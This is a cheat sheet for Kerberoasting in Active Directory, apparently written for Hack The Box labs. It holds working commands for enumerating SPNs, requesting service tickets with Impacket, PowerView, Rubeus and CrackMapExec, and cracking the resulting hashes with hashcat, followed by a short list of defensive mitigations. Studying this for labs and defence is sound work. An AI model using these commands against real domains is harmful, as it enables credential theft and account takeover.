Kerberoasting is a technique to extract and crack service account credentials from Active Directory by request **service tickets(TGS)** fro accounts with **Service Principal Names (SPNs)**

### Target Machines

* Active HTB
* Tentacle HTB

### 1. Enumerate SPNs using ``ldapsearch``

use ``ldapsearch`` to query LDAP service and extract SPNs and UPNs

```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b 'DC=infosecwarrior,DC=local' > ldapsearch-outputs.txt
```

#### Extract ``servicePrincipalName`` Values

```bash
cat ldapsearch-outputs.txt | grep servicePrincipalName
```

save to a list 

```bash
cat ldapsearch-outputs.txt | grep servicePrincipalName | cut -d " " -f2 > servicePrincipalName-list.txt
```

#### Extract ``userPrincipalName`` Value

```bash
cat ldapsearch-outputs.txt | grep userPrincipalName | cut -d " " -f2 > userPrincipalName-list.txt
```

---

### 2. Create Roastable User (for testing)

Use PowerShell to simulate a roastable account by assuming it a SPN

```powershell
$PASSWORD = ConvertTo-SecureString -AsPlaintext -Force -String "Password123"
```

```powershell
New-ADUser -Name "Kerbe-roast" -Description "kerberoasting" -Enabled $true -AccountPassword $PASSWORD
```

```poweshell
Set-ADUser -Identity kerbe-roast -ServicePrincipalNames @{Add="HTTP/dc.infosecwarrior.local"}
```

---

### 3. Kerberoasting with Impacket

#### Using ``GetUsersSPNs.py`` (Requires valid domain credentials)

```bash
GetUserSPNs.py infosecwarrior.local/administrator:Password123 -dc-ip <IP> -request
```

---

### 4. Kerberoasting with PowerView (PowerShell)

if you have a shell on a domain-joined machine you can use PowerView:

```powershell
Import-Module .\PowerView.ps1
```

```Powershell
Get-DomainUser -SPN *
```

To dump hashes directly

```powershell
Invoke-Kerberoast -OutputFormat Hashcat
```

---

### 5. Cracking Kerberos TGS Hashes

#### Exapmle Hash

```bash
$krb5tgs$23$*Administrator$ACTIVE.HTB$........
```

### Crack with HashCat

use the kerberos TGS hash mode ``13100``

```bash
hashcat -a 0 -m 13100 kerberoasting-hash.txt /opt/rockyou.txt 
```

if you are cracking AS-REP roast hashes (etype 23, no pre-auth)

```bash
hashcat -a 0 -m 18200 AS-REP-hash.txt /opt/rockyou.txt 
```

---

### 6. Automated Tools for Lerberoasting

#### Rubeus (C# tool for ticket request and hash extraction)

```bash
Rubeus.exe kerberoast /format:hashcat /domain:infosecwarrior.local /user:username /rc4:hash
```

#### CrackMapExec (Python-based all-in-one framework)

```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt --kerberoasting
```

---

### 7. Mitigations (Blue Team)

* Disable unused service accounts
* Rotate passwords regularly
* Use AES encryption over RC4 for service accounts
* Restrict acounts with SPNs from being used for interactive login
* Implement alerts for unusual TGS request